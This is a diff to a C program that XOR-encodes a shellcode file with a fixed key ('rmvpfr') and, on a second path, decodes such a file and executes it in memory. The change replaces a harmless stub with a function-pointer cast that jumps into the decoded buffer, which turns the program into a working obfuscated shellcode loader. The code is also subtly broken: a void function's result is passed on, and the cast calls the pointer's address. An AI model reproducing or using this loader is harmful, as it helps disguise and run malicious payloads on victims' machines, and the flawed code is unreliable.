@@ -1,21 +1,21 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
-#include <io.h>
+#include <windows.h>
 
 
 int main(int argc, char * argv[]) {
 	
 	if (argv[1]!=NULL && argv[2] !=NULL ){
 		//Create New shellcode file 
-		DecodeCreateNewFile(argv[1],argv[2]);
-		
-		printf("Create new file :%s\n",argv[2]);
-		return 0;
+		EncodeCreateNewFile(argv[1],argv[2]);
+//		printf("Create new file :%s\n",argv[2]);
+
 	}else if (argv[1] != NULL && argv[2] == NULL){
 		//Run shellcode filename:a1
 		
-		RunCode(DecodeCreateNewFile(argv[1]));
+//		char * gooo = DecodeFile(argv[1]);
+		
+		RunCode(DecodeFile(argv[1]));
 		
 		printf("Run shellcode file :%s",argv[1]);
 		return 0;
@@ -24,7 +24,6 @@ int main(int argc, char * argv[]) {
 		return 0;
 	}
 	
-
 	return 0;
 }
 
@@ -40,7 +39,6 @@ void EncodeCreateNewFile(char * oldfile ,char * newfile){
     key = "rmvpfr";    // 加密字串
     // 获取key长度
     keylen = strlen(key);
- 
     fSource = fopen(source, "rb");
     fDest = fopen(dest, "wb");
  
@@ -56,19 +54,18 @@ void EncodeCreateNewFile(char * oldfile ,char * newfile){
         }
     
     }
- 
     fclose(fSource);
     fclose(fDest);
     exit(0);
 
 }
 
-void DecodeCreateNewFile(char * oldfile){
+void DecodeFile(char * file){
 	//decode file
 	int keylen, index=0;
     char *source, *key, fBuffer[1], tBuffer[20], ckey;
     FILE *fSource;
-    source = oldfile;
+    source = file;
     key = "rmvpfr";
     keylen = strlen(key);
     fSource = fopen(source, "rb");
@@ -85,10 +82,10 @@ void DecodeCreateNewFile(char * oldfile){
 }
 
 
-void RunCode(char * file){
+void RunCode(char * code){
 	//Run file load shellcode to RAM
-	printf("Run success");
-	return 0;
+	((void(*)(void))&code)();
+
 }
 
 
